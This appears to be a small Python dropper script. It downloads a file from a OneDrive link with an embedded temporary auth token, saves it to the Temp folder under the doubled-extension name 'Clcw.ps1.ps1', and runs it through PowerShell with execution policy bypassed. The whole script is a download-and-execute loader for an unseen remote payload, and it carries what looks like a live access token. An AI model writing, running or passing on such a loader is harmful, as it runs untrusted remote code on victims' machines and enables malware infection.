import requests
import os
import subprocess

# Your OneDrive link
url = "https://my.microsoftpersonalcontent.com/personal/3ce6f8bdc7595cee/_layouts/15/download.aspx?UniqueId=fce1458c-1c5f-4a15-b69b-fe001711382c&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiI1MWE5MjdkYS05ODQ4LTQ4YzktOGE4NC0wZGUwYjJlNmJjODkiLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzUyMDU5NzE1In0.7N8ZinVnru2Nh_SnZLJf8l3coz9jtN_0lhK_iWafeVfCbUKL52VR1FFVfMrfxTjKTmNoDR7wS22_UWsJhqb2ESxe742Yhwh4GjHfr30kS_3_0_GnY7Pc28KG7dVPB6EYK59qm-pfnUb4u5gSk4-bAmhIxZYnRjPxXZWdDVfNqAg15pMuEAue6jpGPLVisTrRiYSTa6qQ41jkELZJrmFPWdPP4Wu76NnswJh9PWJ9YuNb7wjX7xJRDfAzrKzt1q1oadu1OPN-rEI3-KH31CRFYJ7V3yd97OtSLJ0_pfMtuowjcWtvtoalr_woPNTzCdfuVASIZrzSiMFt_L6I1WXZqFoAoiRjihukYS8WSwbQXNLb1HhlLshYzCwisKVU9GjihMLPigstQOvFHGq7fmLM1YRpz1WdLhlPEEIeURPvyd82ozqP7_3VCPo7GKwaEj1htMHvHMbymLqPVu-L556i__18MNZOi4UykCdnjd-xEF0EGHzND2h7Rbjqhj0Xpgxqns2fKOysBnxC5bZSR4xPhA.FDR10k9poxyt-253YUhsPW32wg-VC-LkqEPikeLLgV8&ApiVersion=2.0"

# Get the system Temp folder path
temp_folder = os.environ.get('TEMP', '/tmp')
file_path = os.path.join(temp_folder, 'Clcw.ps1.ps1')

# Download the file
r = requests.get(url, allow_redirects=True)
with open(file_path, 'wb') as f:
    f.write(r.content)

print(f"File downloaded to {file_path}")

# Execute the downloaded PS1 script
try:
    subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", file_path], check=True)
    print("PowerShell script executed successfully.")
except subprocess.CalledProcessError as e:
    print(f"Error executing PowerShell script: {e}")
